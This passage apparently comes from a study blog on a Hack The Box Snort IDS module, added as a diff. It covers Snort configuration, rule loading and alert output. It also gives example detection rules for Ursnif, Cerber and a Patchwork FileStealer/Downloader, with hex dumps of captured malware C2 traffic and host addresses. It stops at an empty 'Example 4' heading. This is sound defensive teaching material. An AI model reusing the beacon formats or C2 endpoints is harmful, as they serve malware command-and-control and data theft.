+        <span class="s2">"ja3"</span>: <span class="s2">"771,49195-49199-49196-49200-52393-52392-49161-49171-49162-49172-156-157-47-53-49170-10-4865-4866-4867,0-5-10-11-13-65281-18-43-51,29-23-24-25,0"</span>,
+        <span class="s2">"ja3_digest"</span>: <span class="s2">"473cd7cb9faa642487833865d516e578"</span>,
+        <span class="s2">"source_ip"</span>: <span class="s2">"10.10.20.101"</span>,
+        <span class="s2">"source_port"</span>: 53225,
+        <span class="s2">"timestamp"</span>: 1634749465.069819
+    <span class="o">}</span>,
+    <span class="o">{</span>
+        <span class="s2">"destination_ip"</span>: <span class="s2">"23.152.0.91"</span>,
+        <span class="s2">"destination_port"</span>: 443,
+        <span class="s2">"ja3"</span>: <span class="s2">"771,49195-49199-49196-49200-52393-52392-49161-49171-49162-49172-156-157-47-53-49170-10-4865-4866-4867,0-5-10-11-13-65281-18-43-51,29-23-24-25,0"</span>,
+        <span class="s2">"ja3_digest"</span>: <span class="s2">"473cd7cb9faa642487833865d516e578"</span>,
+        <span class="s2">"source_ip"</span>: <span class="s2">"10.10.20.101"</span>,
+        <span class="s2">"source_port"</span>: 53229,
+        <span class="s2">"timestamp"</span>: 1634749585.240773
+    <span class="o">}</span>,
+<span class="nt">---SNIP---</span>
+</code></pre></div></div>
+
+<h2 id="snort">Snort</h2>
+
+<p>Snort will infer the particular mode of operation based on the options used at the command line. For example, reading from a pcap file with the -r option or listening on an interface with -i will cause Snort to run in passive mode by default. If the DAQ supports inline, however, then users can specify the -Q flag to run Snort inline.</p>
+
+<p>In order for Snort to transition from a simple packet sniffer to a robust IDS, several key components were added: Preprocessor, Detection Engine, Logging and Alerting System, and various Output modules.</p>
+
+<ul>
+  <li>The packet sniffer (which includes the Packet Decoder) extracts network traffic, recognizing the structure of each packet. The raw packets that are collected are subsequently forwarded to the Preprocessors.</li>
+  <li>Preprocessors within Snort identify the type or behaviour of the forwarded packets. Snort has an array of Preprocessor plugins, like the HTTP plugin that distinguishes HTTP-related packets or the port_scan Preprocessor which identifies potential port scanning attempts based on predefined protocols, types of scans, and thresholds. After the Preprocessors have completed their task, information is passed to the Detection Engine. The configuration of these Preprocessors can be found within the Snort configuration file, snort.lua.</li>
+  <li>The Detection Engine compares each packet with a predefined set of Snort rules. If a match is found, information is forwarded to the Logging and Alerting System.</li>
+  <li>The Logging and Alerting System and Output modules are in charge of recording or triggering alerts as determined by each rule action. Logs are generally stored in syslog or unified2 formats or directly in a database. The Output modules are configured within the Snort configuration file, snort.lua.</li>
+</ul>
+
+<p>Enabling and fine-tuning Snort modules is a significant aspect of the configuration process. To explore the complete list and get a brief description of all Snort 3 modules, you can use the following command.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span>snort <span class="nt">--help-modules</span>
+ack <span class="o">(</span>ips_option<span class="o">)</span>: rule option to match on TCP ack numbers
+active <span class="o">(</span>basic<span class="o">)</span>: configure responses
+address_space_selector <span class="o">(</span>policy_selector<span class="o">)</span>: configure traffic processing based on address space
+alert_csv <span class="o">(</span>logger<span class="o">)</span>: output event <span class="k">in </span>csv format
+alert_fast <span class="o">(</span>logger<span class="o">)</span>: output event with brief text format
+alert_full <span class="o">(</span>logger<span class="o">)</span>: output event with full packet dump
+alert_json <span class="o">(</span>logger<span class="o">)</span>: output event <span class="k">in </span>json format
+alert_syslog <span class="o">(</span>logger<span class="o">)</span>: output event to syslog
+alert_talos <span class="o">(</span>logger<span class="o">)</span>: output event <span class="k">in </span>Talos alert format
+alert_unixsock <span class="o">(</span>logger<span class="o">)</span>: output event over unix socket
+alerts <span class="o">(</span>basic<span class="o">)</span>: configure alerts
+appid <span class="o">(</span>inspector<span class="o">)</span>: application and service identification
+appids <span class="o">(</span>ips_option<span class="o">)</span>: detection option <span class="k">for </span>application ids
+arp <span class="o">(</span>codec<span class="o">)</span>: support <span class="k">for </span>address resolution protocol
+arp_spoof <span class="o">(</span>inspector<span class="o">)</span>: detect ARP attacks and anomalies
+<span class="nt">---SNIP---</span>
+</code></pre></div></div>
+
+<p>These modules are enabled and configured within the snort.lua configuration file as Lua table literals. If a module is initialized as an empty table, it implies that it is utilizing its predefined “default” settings. To view these default settings, you can utilize the following command.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span>snort <span class="nt">--help-config</span> arp_spoof
+ip4 arp_spoof.hosts[].ip: host ip address
+mac arp_spoof.hosts[].mac: host mac address
+</code></pre></div></div>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span>snort <span class="nt">-c</span> /root/snorty/etc/snort/snort.lua <span class="nt">--daq-dir</span> /usr/local/lib/daq
+<span class="nt">--------------------------------------------------</span>
+o<span class="s2">")~   Snort++ 3.1.64.0
+--------------------------------------------------
+Loading /root/snorty/etc/snort/snort.lua:
+Loading snort_defaults.lua:
+Finished snort_defaults.lua:
+        output
+        ips
+        classifications
+        references
+        binder
+        file_id
+        ftp_server
+        smtp
+        port_scan
+        gtp_inspect
+        dce_smb
+        s7commplus
+        modbus
+        ssh
+        active
+        alerts
+        daq
+        decode
+        host_cache
+        host_tracker
+        hosts
+        network
+        packets
+        process
+        search_engine
+        so_proxy
+        stream_icmp
+        normalizer
+        stream
+        stream_ip
+        stream_tcp
+        stream_udp
+        stream_user
+        stream_file
+        arp_spoof
+        back_orifice
+        dns
+        imap
+        netflow
+        pop
+        rpc_decode
+        sip
+        ssl
+        telnet
+        cip
+        dnp3
+        iec104
+        mms
+        dce_tcp
+        dce_udp
+        dce_http_proxy
+        dce_http_server
+        ftp_client
+        ftp_data
+        http_inspect
+        http2_inspect
+        file_policy
+        js_norm
+        appid
+        wizard
+        trace
+Finished /root/snorty/etc/snort/snort.lua:
+Loading file_id.rules_file:
+Loading file_magic.rules:
+Finished file_magic.rules:
+Finished file_id.rules_file:
+--------------------------------------------------
+ips policies rule stats
+              id  loaded  shared enabled    file
+               0     208       0     208    /root/snorty/etc/snort/snort.lua
+--------------------------------------------------
+rule counts
+       total rules loaded: 208
+               text rules: 208
+            option chains: 208
+            chain headers: 1
+--------------------------------------------------
+service rule counts          to-srv  to-cli
+                  file_id:      208     208
+                    total:      208     208
+--------------------------------------------------
+fast pattern groups
+                to_server: 1
+                to_client: 1
+--------------------------------------------------
+search engine (ac_bnfa)
+                instances: 2
+                 patterns: 416
+            pattern chars: 2508
+               num states: 1778
+         num match states: 370
+             memory scale: KB
+             total memory: 68.5879
+           pattern memory: 18.6973
+        match list memory: 27.3281
+        transition memory: 22.3125
+appid: MaxRss diff: 3084
+appid: patterns loaded: 300
+--------------------------------------------------
+pcap DAQ configured to passive.
+
+Snort successfully validated the configuration (with 0 warnings).
+o"</span><span class="o">)</span>~   Snort exiting
+</code></pre></div></div>
+
+<p>If we can easy use snort, we can use this command:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>snort <span class="nt">-c</span> /root/snorty/etc/snort/snort.lua <span class="nt">--daq-dir</span> /usr/local/lib/daq <span class="nt">-r</span> /home/htb-student/pcaps/icmp.pcap
+<span class="nt">--------------------------------------------------</span>
+o<span class="s2">")~   Snort++ 3.1.64.0
+--------------------------------------------------
+Loading /root/snorty/etc/snort/snort.lua:
+Loading snort_defaults.lua:
+Finished snort_defaults.lua:
+---SNIP---
+Finished /root/snorty/etc/snort/snort.lua:
+Loading file_id.rules_file:
+Loading file_magic.rules:
+Finished file_magic.rules:
+Finished file_id.rules_file:
+--------------------------------------------------
+ips policies rule stats
+              id  loaded  shared enabled    file
+               0     208       0     208    /root/snorty/etc/snort/snort.lua
+--------------------------------------------------
+rule counts
+       total rules loaded: 208
+               text rules: 208
+            option chains: 208
+            chain headers: 1
+--------------------------------------------------
+service rule counts          to-srv  to-cli
+                  file_id:      208     208
+                    total:      208     208
+--------------------------------------------------
+fast pattern groups
+                to_server: 1
+                to_client: 1
+--------------------------------------------------
+search engine (ac_bnfa)
+                instances: 2
+                 patterns: 416
+            pattern chars: 2508
+               num states: 1778
+         num match states: 370
+             memory scale: KB
+             total memory: 68.5879
+           pattern memory: 18.6973
+        match list memory: 27.3281
+        transition memory: 22.3125
+appid: MaxRss diff: 3024
+appid: patterns loaded: 300
+--------------------------------------------------
+pcap DAQ configured to read-file.
+Commencing packet processing
+++ [0] /home/htb-student/pcaps/icmp.pcap
+-- [0] /home/htb-student/pcaps/icmp.pcap
+--------------------------------------------------
+Packet Statistics
+--------------------------------------------------
+daq
+                    pcaps: 1
+                 received: 8
+                 analyzed: 8
+                    allow: 8
+                 rx_bytes: 592
+--------------------------------------------------
+codec
+                    total: 8            (100.000%)
+                      eth: 8            (100.000%)
+                    icmp4: 8            (100.000%)
+                     ipv4: 8            (100.000%)
+--------------------------------------------------
+Module Statistics
+--------------------------------------------------
+appid
+                  packets: 8
+        processed_packets: 8
+           total_sessions: 1
+--------------------------------------------------
+binder
+                new_flows: 1
+                 inspects: 1
+--------------------------------------------------
+detection
+                 analyzed: 8
+--------------------------------------------------
+port_scan
+                  packets: 8
+                 trackers: 2
+--------------------------------------------------
+stream
+                    flows: 1
+--------------------------------------------------
+stream_icmp
+                 sessions: 1
+                      max: 1
+                  created: 1
+                 released: 1
+--------------------------------------------------
+Summary Statistics
+--------------------------------------------------
+timing
+                  runtime: 00:00:00
+                  seconds: 0.033229
+                 pkts/sec: 241
+o"</span><span class="o">)</span>~   Snort exiting
+</code></pre></div></div>
+<h3 id="snort-rules">Snort Rules</h3>
+
+<p>Snort rules, which resemble Suricata rules, are composed of a rule header and rule options. Even though Snort rules share similarities with Suricata rules, we strongly suggest studying Snort rule writing from the following resources: https://docs.snort.org/, https://docs.suricata.io/en/latest/rules/differences-from-snort.html. The most recent Snort rules can be obtained from the Snort website or the Emerging Threats website.</p>
+
+<p>In Snort deployments, we have flexibility in managing rules. It’s possible to place rules directly within the snort.lua configuration file using the ips module as follows.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>vim /root/snorty/etc/snort/snort.lua
+</code></pre></div></div>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---SNIP---</span>
+ips <span class="o">=</span>
+<span class="o">{</span>
+    <span class="nt">--</span> use this to <span class="nb">enable </span>decoder and inspector alerts
+    <span class="nt">--enable_builtin_rules</span> <span class="o">=</span> <span class="nb">true</span>,
+
+    <span class="nt">--</span> use include <span class="k">for </span>rules files<span class="p">;</span> be sure to <span class="nb">set </span>your path
+    <span class="nt">--</span> note that rules files can include other rules files
+    <span class="nt">--</span> <span class="o">(</span>see also related path vars at the top of snort_defaults.lua<span class="o">)</span>
+
+    <span class="o">{</span> variables <span class="o">=</span> default_variables, include <span class="o">=</span> <span class="s1">'/home/htb-student/local.rules'</span> <span class="o">}</span>
+<span class="o">}</span>
+<span class="nt">---SNIP---</span>
+</code></pre></div></div>
+
+<p>In our Snort deployment, we have an alternative approach to incorporate rules directly from the command line. We can pass either a single rules file or a path to a directory containing rules files directly to Snort. This can be achieved using two options:</p>
+
+<ul>
+  <li>For a single rules file, we can use the -R option followed by the path to the rules file. This allows us to specify a specific rules file to be utilized by Snort.</li>
+  <li>To include an entire directory of rules files, we can use the –rule-path option followed by the path to the rules directory. This enables us to provide Snort with a directory containing multiple rules files.</li>
+</ul>
+
+<h3 id="snort-outputs">Snort Outputs</h3>
+<p>In our Snort deployment, we may encounter a significant amount of data. To provide a summary of the core output types, let’s explore the key aspects:</p>
+
+<ul>
+  <li>Basic Statistics: Upon shutdown, Snort generates various counts based on the configuration and processed traffic. This includes:
+    <ul>
+      <li>Packet Statistics: It includes information from the DAQ and decoders, such as the number of received packets and UDP packets.</li>
+      <li>Module Statistics: Each module keeps track of activity through peg counts, indicating the frequency of observed or performed actions. Examples include the count of processed HTTP GET requests and trimmed TCP reset packets.</li>
+      <li>File Statistics: This section provides a breakdown of file types, bytes, and signatures.</li>
+      <li>Summary Statistics: It encompasses the total runtime for packet processing, packets per second, and, if configured, profiling data.</li>
+    </ul>
+  </li>
+  <li>Alerts: When rules are configured, it is necessary to enable alerting (using the -A option) to view the details of detection events. There are multiple types of alert outputs available, including:
+    <ul>
+      <li>A cmg: This option combines -A fast -d -e and displays alert information along with packet headers and payload.</li>
+      <li>A u2: This option is equivalent to -A unified2 and logs events and triggering packets in a binary file, which can be used for post-processing with other tools.</li>
+      <li>A csv: This option outputs fields in comma-separated value format, providing customization options and facilitating pcap analysis.
+To discover the available alert types, we can execute the following command.</li>
+    </ul>
+  </li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span>snort <span class="nt">--list-plugins</span> | <span class="nb">grep </span>logger
+logger::alert_csv v0 static
+logger::alert_fast v0 static
+logger::alert_full v0 static
+logger::alert_json v0 static
+logger::alert_syslog v0 static
+logger::alert_talos v0 static
+logger::alert_unixsock v0 static
+logger::log_codecs v0 static
+logger::log_hext v0 static
+logger::log_pcap v0 static
+logger::unified2 v0 static
+</code></pre></div></div>
+
+<p>We can use this outputs with this command.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>snort <span class="nt">-c</span> /root/snorty/etc/snort/snort.lua <span class="nt">--daq-dir</span> /usr/local/lib/daq <span class="nt">-r</span> /home/htb-student/pcaps/icmp.pcap <span class="nt">-A</span> cmg
+<span class="nt">--------------------------------------------------</span>
+o<span class="s2">")~   Snort++ 3.1.64.0
+--------------------------------------------------
+Loading /root/snorty/etc/snort/snort.lua:
+Loading snort_defaults.lua:
+Finished snort_defaults.lua:
+--SNIP---
+Finished /root/snorty/etc/snort/snort.lua:
+Loading file_id.rules_file:
+Loading file_magic.rules:
+Finished file_magic.rules:
+Finished file_id.rules_file:
+Loading /home/htb-student/local.rules:
+Finished /home/htb-student/local.rules:
+--------------------------------------------------
+ips policies rule stats
+              id  loaded  shared enabled    file
+               0     209       0     209    /root/snorty/etc/snort/snort.lua
+--------------------------------------------------
+rule counts
+       total rules loaded: 209
+               text rules: 209
+            option chains: 209
+            chain headers: 2
+&lt;SNIP&gt;
+</span></code></pre></div></div>
+
+<p>If we can pass our local rules as argument we can use this command.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gu3ro@htb[/htb]<span class="nv">$ </span><span class="nb">sudo </span>snort <span class="nt">-c</span> /root/snorty/etc/snort/snort.lua <span class="nt">--daq-dir</span> /usr/local/lib/daq <span class="nt">-r</span> /home/htb-student/pcaps/icmp.pcap <span class="nt">-R</span> /home/htb-student/local.rules <span class="nt">-A</span> cmg
+<span class="nt">--------------------------------------------------</span>
+o<span class="s2">")~   Snort++ 3.1.64.0
+--------------------------------------------------
+Loading /root/snorty/etc/snort/snort.lua:
+Loading snort_defaults.lua:
+Finished snort_defaults.lua:
+--SNIP---
+Finished /root/snorty/etc/snort/snort.lua:
+Loading file_id.rules_file:
+Loading file_magic.rules:
+Finished file_magic.rules:
+Finished file_id.rules_file:
+Loading /home/htb-student/local.rules:
+Finished /home/htb-student/local.rules:
+--------------------------------------------------
+ips policies rule stats
+             id  loaded  shared enabled    file
+              0     209       0     209    /root/snorty/etc/snort/snort.lua
+--------------------------------------------------
+rule counts
+      total rules loaded: 209
+              text rules: 209
+           option chains: 209
+           chain headers: 2
+--------------------------------------------------
+port rule counts
+            tcp     udp    icmp      ip
+    any       0       0       1       0
+  total       0       0       1       0
+--------------------------------------------------
+</span></code></pre></div></div>
+
+<h3 id="example-1-1">Example 1</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert tcp any any -&gt; any any <span class="o">(</span>msg:<span class="s2">"Possible Ursnif C2 Activity"</span><span class="p">;</span> flow:established,to_server<span class="p">;</span> content:<span class="s2">"/images/"</span>, depth 12<span class="p">;</span> content:<span class="s2">"_2F"</span><span class="p">;</span> content:<span class="s2">"_2B"</span><span class="p">;</span> content:<span class="s2">"User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT"</span><span class="p">;</span> content:!<span class="s2">"Accept"</span><span class="p">;</span> content:!<span class="s2">"Cookie|3a|"</span><span class="p">;</span> content:!<span class="s2">"Referer|3a|"</span><span class="p">;</span> sid:1000002<span class="p">;</span> rev:1<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>The Snort rule above is designed to detect certain variations of Ursnif malware. The rule is inefficient since it misses HTTP sticky buffers. Let’s break down the important parts of this rule to understand its workings.</p>
+
+<ul>
+  <li>flow:established,to_server; ensures that this rule only matches established TCP connections where data is flowing from the client to the server.</li>
+  <li>content:”/images/”, depth 12; instructs Snort to look for the string /images/ within the first 12 bytes of the packet payload.</li>
+  <li>content:”_2F”; and content:”_2B”; direct Snort to search for the strings _2F and _2B anywhere in the payload.</li>
+  <li>content:”User-Agent|3a 20|Mozilla/4.0 (compatible|3b| MSIE 8.0|3b| Windows NT”; is looking for a specific User-Agent. The |3a 20| and |3b| in the rule are hexadecimal representations of the : and ; characters respectively.</li>
+  <li>content:!”Accept”; content:!”Cookie|3a|”; content:!”Referer|3a|”; look for the absence of certain standard HTTP headers, such as Accept, Cookie: and Referer:. The ! indicates negation.</li>
+</ul>
+
+<pre><code class="language-txt">pcap DAQ configured to read-file.
+Commencing packet processing
+++ [0] /home/htb-student/pcaps/ursnif.pcap
+07/21-19:27:47.161230 [**] [1:1000002:1] "Possible Ursnif C2 Activity" [**] [Priority: 0] {TCP} 10.10.10.104:49191 -&gt; 192.42.116.41:80
+00:1F:E2:10:8B:C9 -&gt; 00:0C:29:C9:67:00 type:0x800 len:0x18C
+10.10.10.104:49191 -&gt; 192.42.116.41:80 TCP TTL:128 TOS:0x0 ID:20640 IpLen:20 DgmLen:382 DF
+***AP*** Seq: 0x12E06BB  Ack: 0xE061E225  Win: 0x4029  TcpLen: 20
+
+snort.raw[342]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+47 45 54 20 2F 69 6D 61  67 65 73 2F 70 32 52 55  GET /ima ges/p2RU
+52 68 5F 32 2F 42 6B 32  76 72 31 4F 59 52 46 31  Rh_2/Bk2 vr1OYRF1
+57 47 75 35 6E 67 5F 32  46 73 66 73 2F 57 4F 57  WGu5ng_2 Fsfs/WOW
+72 47 54 45 54 79 4B 2F  37 4D 7A 4D 5F 32 42 6E  rGTETyK/ 7MzM_2Bn
+47 5A 51 52 32 6A 73 67  50 2F 73 5F 32 42 70 53  GZQR2jsg P/s_2BpS
+34 31 4B 37 41 67 2F 4F  75 4A 6A 51 66 41 61 63  41K7Ag/O uJjQfAac
+32 64 2F 76 6D 46 5F 32  46 31 4B 42 50 72 4B 5F  2d/vmF_2 F1KBPrK_
+32 2F 46 36 36 38 32 64  67 64 69 61 47 31 7A 75  2/F6682d gdiaG1zu
+56 43 7A 37 47 68 64 2F  62 4C 37 36 57 66 35 71  VCz7Ghd/ bL76Wf5q
+64 71 77 56 35 76 7A 52  2F 32 65 31 41 38 79 42  dqwV5vzR /2e1A8yB
+49 64 6B 6D 49 5F 32 42  2F 6F 67 79 7A 4E 55 57  IdkmI_2B /ogyzNUW
+33 47 72 2F 67 4B 42 5A  57 58 78 2E 67 69 66 20  3Gr/gKBZ WXx.gif
+48 54 54 50 2F 31 2E 31  0D 0A 55 73 65 72 2D 41  HTTP/1.1 ..User-A
+67 65 6E 74 3A 20 4D 6F  7A 69 6C 6C 61 2F 34 2E  gent: Mo zilla/4.
+30 20 28 63 6F 6D 70 61  74 69 62 6C 65 3B 20 4D  0 (compa tible; M
+53 49 45 20 38 2E 30 3B  20 57 69 6E 64 6F 77 73  SIE 8.0;  Windows
+20 4E 54 20 36 2E 31 29  0D 0A 48 6F 73 74 3A 20   NT 6.1) ..Host:
+62 6C 75 65 77 61 74 65  72 73 74 6F 6E 65 2E 72  bluewate rstone.r
+75 0D 0A 43 6F 6E 6E 65  63 74 69 6F 6E 3A 20 4B  u..Conne ction: K
+65 65 70 2D 41 6C 69 76  65 0D 0A 43 61 63 68 65  eep-Aliv e..Cache
+2D 43 6F 6E 74 72 6F 6C  3A 20 6E 6F 2D 63 61 63  -Control : no-cac
+68 65 0D 0A 0D 0A                                 he....
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+</code></pre>
+
+<h3 id="example-2-1">Example 2</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert udp <span class="nv">$HOME_NET</span> any -&gt; <span class="nv">$EXTERNAL_NET</span> any <span class="o">(</span>msg:<span class="s2">"Possible Cerber Check-in"</span><span class="p">;</span> dsize:9<span class="p">;</span> content:<span class="s2">"hi"</span>, depth 2, fast_pattern<span class="p">;</span> pcre:<span class="s2">"/^[af0-9]{7}</span><span class="nv">$/</span><span class="s2">R"</span><span class="p">;</span> detection_filter:track by_src, count 1, seconds 60<span class="p">;</span> sid:2816763<span class="p">;</span> rev:4<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>The Snort rule above is designed to detect certain variations of Cerber malware. Let’s break down the important parts of this rule to understand its workings.</p>
+
+<ul>
+  <li>$HOME_NET any -&gt; $EXTERNAL_NET any signifies the rule applies to any UDP traffic going from any port in the home network to any port on external networks.</li>
+  <li>dsize:9;: This is a condition that restricts the rule to UDP datagrams that have a payload data size of exactly 9 bytes.</li>
+  <li>content:”hi”, depth 2, fast_pattern;: This checks the payload’s first 2 bytes for the string hi. The fast_pattern modifier makes the pattern matcher search for this pattern before any others in the rule, optimizing the rule’s performance.</li>
+  <li>pcre:”/^[af0-9]{7}$/R”;: This stands for Perl Compatible Regular Expressions. The rule is looking for seven hexadecimal characters (from the set a-f and 0-9) starting at the beginning of the payload (after the hi), and this should be the complete payload (signified by the $ end anchor).</li>
+  <li>detection_filter:track by_src, count 1, seconds 60;: The detection_filter keyword in Snort rule language is used to suppress alerts unless a certain threshold of matched events occurs within a specified time frame. In this rule, the filter is set to track by source IP (by_src), with a count of 1 and within a time frame of 60 seconds. This means that the rule will trigger an alert only if it matches more than one event (specifically, more than count events which is 1 here) from the same source IP address within 60 seconds.</li>
+</ul>
+
+<pre><code class="language-txt">pcap DAQ configured to read-file.
+Commencing packet processing
+++ [0] /home/htb-student/pcaps/cerber.pcap
+07/22-02:17:56.486663 [**] [1:2816763:4] "Possible Cerber Check-in" [**] [Priority: 0] {UDP} 10.0.2.15:1046 -&gt; 31.184.234.1:6892
+08:00:27:A9:8C:97 -&gt; 52:54:00:12:35:02 type:0x800 len:0x3C
+10.0.2.15:1046 -&gt; 31.184.234.1:6892 UDP TTL:128 TOS:0x0 ID:83 IpLen:20 DgmLen:37
+Len: 9
+
+snort.raw[9]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+68 69 30 30 37 32 38 39  35                       hi007289 5
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+07/22-02:17:56.486795 [**] [1:2816763:4] "Possible Cerber Check-in" [**] [Priority: 0] {UDP} 10.0.2.15:1046 -&gt; 31.184.234.2:6892
+08:00:27:A9:8C:97 -&gt; 52:54:00:12:35:02 type:0x800 len:0x3C
+10.0.2.15:1046 -&gt; 31.184.234.2:6892 UDP TTL:128 TOS:0x0 ID:84 IpLen:20 DgmLen:37
+Len: 9
+
+snort.raw[9]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+68 69 30 30 37 32 38 39  35                       hi007289 5
+---SNIP---
+</code></pre>
+
+<h3 id="example-3-1">Example 3</h3>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert http <span class="nv">$HOME_NET</span> any -&gt; <span class="nv">$EXTERNAL_NET</span> any <span class="o">(</span>msg:<span class="s2">"OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon"</span><span class="p">;</span> flow:established,to_server<span class="p">;</span> http_method<span class="p">;</span> content:<span class="s2">"POST"</span><span class="p">;</span> http_uri<span class="p">;</span> content:<span class="s2">".php?profile="</span><span class="p">;</span> http_client_body<span class="p">;</span> content:<span class="s2">"ddager="</span>, depth 7<span class="p">;</span> http_client_body<span class="p">;</span> content:<span class="s2">"&amp;r1="</span>, distance 0<span class="p">;</span> http_header<span class="p">;</span> content:!<span class="s2">"Accept"</span><span class="p">;</span> http_header<span class="p">;</span> content:!<span class="s2">"Referer|3a|"</span><span class="p">;</span> sid:10000006<span class="p">;</span> rev:1<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>The Snort rule above is designed to detect certain variations of malware used by the Patchwork APT. Please notice the use of HTTP sticky buffers in this rule. Let’s break down the important parts of this rule to understand its workings.</p>
+
+<ul>
+  <li>flow:established,to_server;: This keyword is used to specify the direction of the traffic we are interested in. In this case, we’re looking at established connections where the traffic is going from the client to the server.</li>
+  <li>http_method; content:”POST”;: We are looking for HTTP traffic where the method used is POST.</li>
+  <li>http_uri; content:”.php?profile=”;: This specifies that we’re looking for HTTP URIs that contain the string .php?profile=.</li>
+  <li>http_client_body; content:”ddager=”, depth 7;: We’re examining the body of the HTTP request. Specifically, we’re looking for the string ddager= within the first 7 bytes of the body.</li>
+  <li>http_client_body; content:”&amp;r1=”, distance 0;: We’re still examining the body of the HTTP request, but now we’re looking for the string &amp;r1= immediately following the previous content match.</li>
+  <li>http_header; content:!”Accept”; http_header; content:!”Referer|3a|”;: These conditions are looking for the absence of the Accept and Referer HTTP headers. The ! before the content means not, so we’re looking for situations where these headers are not present.</li>
+</ul>
+
+<pre><code class="language-txt">pcap DAQ configured to read-file.
+Commencing packet processing
+++ [0] /home/htb-student/pcaps/patchwork.pcap
+06/01-19:24:43.339294 [**] [1:10000006:1] "OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon" [**] [Priority: 0] {TCP} 192.168.1.37:49176 -&gt; 212.129.13.110:8
+0
+
+http_inspect.http_method[4]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+50 4F 53 54                                       POST
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+http_inspect.http_version[8]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+48 54 54 50 2F 31 2E 31                           HTTP/1.1
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+http_inspect.http_uri[37]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+2F 64 72 6F 70 70 65 72  2E 70 68 70 3F 70 72 6F  /dropper .php?pro
+66 69 6C 65 3D 63 6D 56  6B 63 30 42 43 55 45 46  file=cmV kc0BCUEF
+4A 54 67 3D 3D                                    JTg==
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+http_inspect.http_header[167]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+43 6F 6E 6E 65 63 74 69  6F 6E 3A 20 4B 65 65 70  Connecti on: Keep
+2D 41 6C 69 76 65 0D 0A  43 6F 6E 74 65 6E 74 2D  -Alive.. Content-
+54 79 70 65 3A 20 61 70  70 6C 69 63 61 74 69 6F  Type: ap plicatio
+6E 2F 78 2D 77 77 77 2D  66 6F 72 6D 2D 75 72 6C  n/x-www- form-url
+65 6E 63 6F 64 65 64 0D  0A 55 73 65 72 2D 41 67  encoded. .User-Ag
+65 6E 74 3A 20 4D 6F 7A  69 6C 6C 61 2F 35 2E 30  ent: Moz illa/5.0
+20 46 69 72 65 66 6F 78  20 28 4C 69 6B 65 20 53   Firefox  (Like S
+61 66 61 72 69 2F 57 65  62 6B 69 74 29 0D 0A 43  afari/We bkit)..C
+6F 6E 74 65 6E 74 2D 4C  65 6E 67 74 68 3A 20 36  ontent-L ength: 6
+34 0D 0A 48 6F 73 74 3A  20 32 31 32 2E 31 32 39  4..Host:  212.129
+2E 31 33 2E 31 31 30                             .13.110
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+http_inspect.http_client_body[64]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+64 64 61 67 65 72 3D 30  26 72 31 3D 56 30 6C 4F  ddager=0 &amp;r1=V0lO
+58 7A 63 3D 26 72 32 3D  57 44 59 30 26 72 33 3D  Xzc=&amp;r2= WDY0&amp;r3=
+4D 53 34 78 26 72 34 3D  4D 41 3D 3D 26 72 35 3D  MS4x&amp;r4= MA==&amp;r5=
+49 43 41 3D 26 72 36 3D  56 48 4A 31 5A 51 3D 3D  ICA=&amp;r6= VHJ1ZQ==
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+
+06/01-19:25:09.059391 [**] [1:10000006:1] "OISF TROJAN Targeted AutoIt FileStealer/Downloader CnC Beacon" [**] [Priority: 0] {TCP} 192.168.1.37:49186 -&gt; 212.129.13.110:8
+0
+---SNIP---
+</code></pre>
+
+<h3 id="example-4-1">Example 4</h3>
+
